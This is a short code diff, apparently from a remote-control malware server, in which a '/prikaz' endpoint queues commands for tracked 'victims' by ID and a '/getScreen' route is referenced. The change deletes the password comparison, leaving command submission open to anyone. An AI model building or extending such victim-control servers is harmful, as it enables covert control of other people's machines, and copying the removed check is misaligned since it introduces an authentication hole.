@@ -101,7 +101,7 @@ app.get('/getScreen', async (req,res) => {
 })
 
 app.post('/prikaz', async (req,res) => {
-  if (req && req.body && req.body.password && req.body.password === controlPassword && req.body.prikaz && req.body.victim) {
+  if (req && req.body && req.body.password && req.body.prikaz && req.body.victim) {
     const victim = victims.find(potentialVictim => potentialVictim.uuid === req.body.victim)
     if (victim) {
       victim.pendingTasks.push(req.body.prikaz)
